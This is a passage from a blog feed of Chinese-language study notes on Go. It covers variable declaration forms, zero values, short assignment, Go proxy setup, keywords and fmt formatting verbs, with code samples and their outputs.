title="第一种，指定变量类型，如果没有初始化，则变量默认为零值"></a><strong>第一种，指定变量类型，如果没有初始化，则变量默认为零值</strong></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个变量并初始化</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">&quot;RUNOOB&quot;</span></span><br><span class="line">    fmt.Println(a)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有初始化就为零值</span></span><br><span class="line">    <span class="keyword">var</span> b <span class="type">int</span></span><br><span class="line">    fmt.Println(b)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bool 零值为 false</span></span><br><span class="line">    <span class="keyword">var</span> c <span class="type">bool</span></span><br><span class="line">    fmt.Println(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>result：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Go\go_WorkSpace&gt; go run .\hello.go</span><br><span class="line">RUNOOB</span><br><span class="line">0</span><br><span class="line">false</span><br></pre></td></tr></table></figure><h5 id="零值"><a href="#零值" class="headerlink" title="零值"></a>零值</h5><ul><li><p>数值类型（包括complex64&#x2F;128）为 <strong>0</strong></p></li><li><p>布尔类型为 <strong>false</strong></p></li><li><p>字符串为 **””**（空字符串）</p></li><li><p>以下几种类型为 <strong>nil</strong>：</p></li><li><pre><code>var a *intvar a []intvar a map[string] intvar a chan intvar a func(string) intvar a error // error 是接口<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```go</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    var i int</span><br><span class="line">    var f float64</span><br><span class="line">    var b bool</span><br><span class="line">    var s string</span><br><span class="line">    fmt.Printf(&quot;%v %v %v %q\n&quot;, i, f, b, s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Result:</span><br><span class="line">0 0 false &quot;&quot;</span><br></pre></td></tr></table></figure><h4 id="第二种，根据值自行判定变量类型。"><a href="#第二种，根据值自行判定变量类型。" class="headerlink" title="第二种，根据值自行判定变量类型。"></a><strong>第二种，根据值自行判定变量类型。</strong></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="literal">true</span></span><br><span class="line">    fmt.Println(d)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Result:</span></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure><h4 id="第三种，如果变量已经使用-var-声明过了，再使用-声明变量，就产生编译错误，格式："><a href="#第三种，如果变量已经使用-var-声明过了，再使用-声明变量，就产生编译错误，格式：" class="headerlink" title="第三种，如果变量已经使用 var 声明过了，再使用 *:&#x3D;* 声明变量，就产生编译错误，格式："></a><strong>第三种，如果变量已经使用 var 声明过了，再使用 *<em>:&#x3D;*</em> 声明变量，就产生编译错误，格式：</strong></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> intVal <span class="type">int</span> </span><br><span class="line">intVal :=<span class="number">1</span> <span class="comment">// 这时候会产生编译错误，因为 intVal 已经声明，不需要重新声明</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intVal := <span class="number">1</span> <span class="comment">// 此时不会产生编译错误，因为有声明新的变量，因为 := 是一个声明语句</span></span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> intVal <span class="type">int</span> </span><br><span class="line">intVal =<span class="number">1</span> </span><br></pre></td></tr></table></figure><p>可以将 var f string &#x3D; “Runoob” 简写为 f :&#x3D; “Runoob”：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    f := <span class="string">&quot;Runoob&quot;</span> <span class="comment">// var f string = &quot;Runoob&quot;</span></span><br><span class="line"></span><br><span class="line">    fmt.Println(f)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>result：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Go\go_WorkSpace&gt; go run .\hello.go</span><br><span class="line">Runoob</span><br></pre></td></tr></table></figure><h3 id="多变量声明"><a href="#多变量声明" class="headerlink" title="多变量声明"></a>多变量声明</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类型相同多个变量, 非全局变量</span></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 <span class="keyword">type</span></span><br><span class="line">vname1, vname2, vname3 = v1, v2, v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 = v1, v2, v3 <span class="comment">// 和 python 很像,不需要显示声明类型，自动推断</span></span><br><span class="line"></span><br><span class="line">vname1, vname2, vname3 := v1, v2, v3 <span class="comment">// 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种因式分解关键字的写法一般用于声明全局变量</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    vname1 v_type1</span><br><span class="line">    vname2 v_type2</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> (  <span class="comment">// 这种因式分解关键字的写法一般用于声明全局变量</span></span><br><span class="line">    a <span class="type">int</span></span><br><span class="line">    b <span class="type">bool</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c, d <span class="type">int</span> = <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> e, f = <span class="number">123</span>, <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这种不带声明格式的只能在函数体中出现</span></span><br><span class="line"><span class="comment">//g, h := 123, &quot;hello&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    g, h := <span class="number">123</span>, <span class="string">&quot;hello&quot;</span></span><br><span class="line">    fmt.Println(x, y, a, b, c, d, e, f, g, h)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Result：</span><br><span class="line">0 0 0 false 1 2 123 hello 123 hello</span><br></pre></td></tr></table></figure><h3 id="值类型和引用类型"><a href="#值类型和引用类型" class="headerlink" title="值类型和引用类型"></a>值类型和引用类型</h3><p>所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值：</p><p><img src="/Gopic/4.4.2_fig4.1.jpg" alt="1"></p><p>当使用等号 <code>=</code> 将一个变量的值赋值给另一个变量时，如：<code>j = i</code>，实际上是在内存中将 i 的值进行了拷贝：</p><p><img src="/Gopic/4.4.2_fig4.2.jpg" alt="2"></p><p>你可以通过 &amp;i 来获取变量 i 的内存地址，例如：0xf840000040（每次的地址都可能不一样）。</p><p>值类型变量的值存储在堆中。</p><p>内存地址会根据机器的不同而有所不同，甚至相同的程序在不同的机器上执行后也会有不同的内存地址。因为每台机器可能有不同的存储器布局，并且位置分配也可能不同。</p><p>更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。</p><p>一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置。</p><p><img src="/Gopic/4.4.2_fig4.3.jpg" alt="3"></p><p>这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。</p><p>同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。</p><p>当使用赋值语句 r2 &#x3D; r1 时，只有引用（地址）被复制。</p><p>如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。</p><hr><h3 id="简短形式，使用-赋值操作符"><a href="#简短形式，使用-赋值操作符" class="headerlink" title="简短形式，使用 :&#x3D; 赋值操作符"></a>简短形式，使用 :&#x3D; 赋值操作符</h3><p>我们知道可以在变量的初始化时省略变量的类型而由系统自动推断，声明语句写上 var 关键字其实是显得有些多余了，因此我们可以将它们简写为 a :&#x3D; 50 或 b :&#x3D; false。</p><p>a 和 b 的类型（int 和 bool）将由编译器自动推断。</p><p>这是使用变量的首选形式，但是它只能被用在函数体内，而不可以用于全局变量的声明与赋值。使用操作符 :&#x3D; 可以高效地创建一个新的变量，称之为初始化声明。</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>如果在相同的代码块中，我们不可以再次对于相同名称的变量使用初始化声明，例如：a :&#x3D; 20 就是不被允许的，编译器会提示错误 no new variables on left side of :&#x3D;，但是 a &#x3D; 20 是可以的，因为这是给相同的变量赋予一个新的值。</p><p>如果你在定义变量 a 之前使用它，则会得到编译错误 undefined: a。</p><p>如果你声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误，例如下面这个例子当中的变量 a：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">var</span> a <span class="type">string</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line">  fmt.Println(<span class="string">&quot;hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试编译这段代码将得到错误 <strong>a declared but not used</strong>。</p><p>此外，单纯地给 a 赋值也是不够的，这个值必须被使用，所以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(&quot;hello, world&quot;, a)</span><br></pre></td></tr></table></figure><p>会移除错误。</p><p>但是全局变量是允许声明但不使用的。 同一类型的多个变量可以声明在同一行，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a, b, c int</span><br></pre></td></tr></table></figure><p>多变量可以在同一行进行赋值，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a, b int</span><br><span class="line">var c string</span><br><span class="line">a, b, c = 5, 7, &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>上面这行假设了变量 a，b 和 c 都已经被声明，否则的话应该这样使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, c := 5, 7, &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>右边的这些值以相同的顺序赋值给左边的变量，所以 a 的值是 5， b 的值是 7，c 的值是 “abc”。</p><p>这被称为 并行 或 同时 赋值。</p><p>如果你想要交换两个变量的值，则可以简单地使用 <strong>a, b &#x3D; b, a</strong>，两个变量的类型必须是相同。</p><p>空白标识符 _ 也被用于抛弃值，如值 5 在：_, b &#x3D; 5, 7 中被抛弃。</p><p>_ 实际上是一个只写变量，你不能得到它的值。这样做是因为 Go 语言中你必须使用所有被声明的变量，但有时你并不需要使用从一个函数得到的所有返回值。</p><p>并行赋值也被用于当一个函数返回多个返回值时，比如这里的 val 和错误 err 是通过调用 Func1 函数同时得到：val, err &#x3D; Func1(var1)。</p>]]></content>
      
      
      <categories>
          
          <category> GO语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO语言1</title>
      <link href="/2024/08/31/GO%E8%AF%AD%E8%A8%801/"/>
      <url>/2024/08/31/GO%E8%AF%AD%E8%A8%801/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h1><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>跟其他语言环境差不多，下载，然后改环境变量</p><p><img src="/Gopic/image-20240831141049239.png" alt="image"></p><p><img src="/Gopic/image-20240831141117949.png" alt="image"></p><p>改源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看Go版本</span><br><span class="line">go version</span><br><span class="line"></span><br><span class="line">#查看Go环境变量</span><br><span class="line">go env</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#开启mod模式（项目管理需要用到）</span><br><span class="line">go env -w GO111MODULE=on</span><br><span class="line">#重新设置成七牛镜像源（推荐）或阿里镜像源（用原有的会比较慢）</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br><span class="line">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy</span><br><span class="line"></span><br><span class="line">#关闭包的MD5校验</span><br><span class="line">go env -w GOSUMDB=off</span><br><span class="line"></span><br><span class="line">#查看环境变量</span><br><span class="line">go env</span><br></pre></td></tr></table></figure><h2 id="Go-语言结构"><a href="#Go-语言结构" class="headerlink" title="Go 语言结构"></a>Go 语言结构</h2><p>Go 语言的基础组成有以下几个部分：</p><ul><li>包声明</li><li>引入包</li><li>函数</li><li>变量</li><li>语句 &amp; 表达式</li><li>注释</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//示例</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>第一行代码 <em><strong>package main</strong></em> 定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。</li><li>下一行 <em><strong>import “fmt”</strong></em> 告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO的函数。</li><li>下一行 <em><strong>func main()</strong></em> 是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。</li><li>下一行 &#x2F;<em>…</em>&#x2F; 是注释，在程序执行时将被忽略。单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾，且不可以嵌套使用，多行注释一般用于包的文档描述或注释成块的代码片段。</li><li>下一行 <em><strong>fmt.Println(…)</strong></em> 可以将字符串输出到控制台，并在最后自动增加换行字符 \n。<br>使用 <strong>fmt.Print(“hello, world\n”)</strong> 可以得到相同的结果。<br>Print 和 Println 这两个函数也支持使用变量，如：fmt.Println(arr)。如果没有特别指定，它们会以默认的打印格式将变量 arr 输出到控制台。</li><li>当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ）。</li></ol><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>在终端进入路径后go run</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Go\go_WorkSpace&gt; go run hello.go</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure><h2 id="Go-语言基础语法"><a href="#Go-语言基础语法" class="headerlink" title="Go 语言基础语法"></a>Go 语言基础语法</h2><h3 id="Go-标记"><a href="#Go-标记" class="headerlink" title="Go 标记"></a>Go 标记</h3><p>Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。</p><p>如以下 GO 语句由 6 个标记组成：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> fmt</span><br><span class="line"><span class="number">2.</span> .</span><br><span class="line"><span class="number">3.</span> Println</span><br><span class="line"><span class="number">4.</span> (</span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"><span class="number">6.</span> )</span><br></pre></td></tr></table></figure><h3 id="行分割符"><a href="#行分割符" class="headerlink" title="行分割符"></a>行分割符</h3><p>在 Go 程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。</p><p>如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。</p><p>以下为两个语句：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;菜鸟教程：runoob.com&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行</span></span><br><span class="line"><span class="comment">注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>标识符用来命名变量、类型等程序实体。一个标识符实际上就是**一个或是多个字母(A<del>Z和a</del>z)数字(0~9)、下划线_**组成的序列，但是第一个字符必须是字母或下划线而不能是数字。</p><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><p>Go 语言的字符串连接可以通过 <strong>+</strong> 实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Google&quot;</span> + <span class="string">&quot;Runoob&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GoogleRunoob</span><br></pre></td></tr></table></figure><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><table><thead><tr><th align="left">Go中会使用到的关键字或保留字</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td align="left">break</td><td>default</td><td>func</td><td>interface</td><td>select</td></tr><tr><td align="left">case</td><td>defer</td><td>go</td><td>map</td><td>struct</td></tr><tr><td align="left">chan</td><td>else</td><td>goto</td><td>package</td><td>switch</td></tr><tr><td align="left">const</td><td>fallthrough</td><td>if</td><td>range</td><td>type</td></tr><tr><td align="left">continue</td><td>for</td><td>import</td><td>return</td><td>var</td></tr></tbody></table><table><thead><tr><th>预定义标识符</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>append</td><td>bool</td><td>byte</td><td>cap</td><td>close</td><td>complex</td><td>complex64</td><td>complex128</td><td>uint16</td></tr><tr><td>copy</td><td>false</td><td>float32</td><td>float64</td><td>imag</td><td>int</td><td>int8</td><td>int16</td><td>uint32</td></tr><tr><td>int32</td><td>int64</td><td>iota</td><td>len</td><td>make</td><td>new</td><td>nil</td><td>panic</td><td>uint64</td></tr><tr><td>print</td><td>println</td><td>real</td><td>recover</td><td>string</td><td>true</td><td>uint</td><td>uint8</td><td>uintptr</td></tr></tbody></table><p>程序一般由关键字、常量、变量、运算符、类型和函数组成。</p><p>程序中可能会使用到这些分隔符：括号 ()，中括号 [] 和大括号 {}。</p><p>程序中可能会使用到这些标点符号：**.<strong>、</strong>,<strong>、</strong>;<strong>、</strong>:** 和 <strong>…</strong>。</p><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>Go 语言中使用 <strong>fmt.Sprintf</strong> 或 <strong>fmt.Printf</strong> 格式化字符串并赋值给新串：</p><ul><li><strong>Sprintf</strong> 根据格式化参数生成格式化的字符串并返回该字符串。</li><li><strong>Printf</strong> 根据格式化参数生成格式化的字符串并写入标准输出。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">// %d 表示整型数字，%s 表示字符串</span></span><br><span class="line">    <span class="keyword">var</span> stockcode=<span class="number">123</span></span><br><span class="line">    <span class="keyword">var</span> enddate=<span class="string">&quot;2020-12-31&quot;</span></span><br><span class="line">    <span class="keyword">var</span> url=<span class="string">&quot;Code=%d&amp;endDate=%s&quot;</span></span><br><span class="line">    <span class="keyword">var</span> target_url=fmt.Sprintf(url,stockcode,enddate)</span><br><span class="line">    fmt.Println(target_url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Code=<span class="number">123</span>&amp;endDate=<span class="number">2020</span><span class="number">-12</span><span class="number">-31</span></span><br></pre></td></tr></table></figure><h4 id="Go-可以使用-fmt-Sprintf-来格式化字符串"><a href="#Go-可以使用-fmt-Sprintf-来格式化字符串" class="headerlink" title="Go 可以使用 fmt.Sprintf 来格式化字符串"></a>Go 可以使用 fmt.Sprintf 来格式化字符串</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Sprintf(格式化样式, 参数列表…)</span><br></pre></td></tr></table></figure><ul><li><strong>格式化样式：</strong>字符串形式，格式化符号以 <strong>%</strong> 开头， %s 字符串格式，%d 十进制的整数格式。</li><li><strong>参数列表：</strong>多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</li></ul><p>Go 字符串格式化符号:</p><table><thead><tr><th>格  式</th><th align="left">描  述</th></tr></thead><tbody><tr><td>%v</td><td align="left">按值的本来值输出</td></tr><tr><td>%+v</td><td align="left">在 %v 基础上，对结构体字段名和值进行展开</td></tr><tr><td>%#v</td><td align="left">输出 Go 语言语法格式的值</td></tr><tr><td>%T</td><td align="left">输出 Go 语言语法格式的类型和值</td></tr><tr><td>%%</td><td align="left">输出 % 本体</td></tr><tr><td>%b</td><td align="left">整型以二进制方式显示</td></tr><tr><td>%o</td><td align="left">整型以八进制方式显示</td></tr><tr><td>%d</td><td align="left">整型以十进制方式显示</td></tr><tr><td>%x</td><td align="left">整型以十六进制方式显示</td></tr><tr><td>%X</td><td align="left">整型以十六进制、字母大写方式显示</td></tr><tr><td>%U</td><td align="left">Unicode 字符</td></tr><tr><td>%f</td><td align="left">浮点数</td></tr><tr><td>%p</td><td align="left">指针，十六进制方式显示</td></tr></tbody></table><p><strong>对齐方式：</strong></p><p>通过在格式化字符串中使用宽度和对齐参数，可以控制生成的字符串的对齐方式。</p><p>常用的对齐参数有：</p><ul><li><p>%s</p><p>：字符串格式，可以使用以下对齐参数：</p><ul><li><code>%s</code>：默认对齐方式，左对齐。</li><li><code>%10s</code>：指定宽度为 10 的右对齐。</li><li><code>%-10s</code>：指定宽度为 10 的左对齐。</li></ul></li><li><p>%d</p><p>：整数格式，可以使用以下对齐参数：</p><ul><li><code>%d</code>：默认对齐方式，右对齐。</li><li><code>%10d</code>：指定宽度为 10 的右对齐。</li><li><code>%-10d</code>：指定宽度为 10 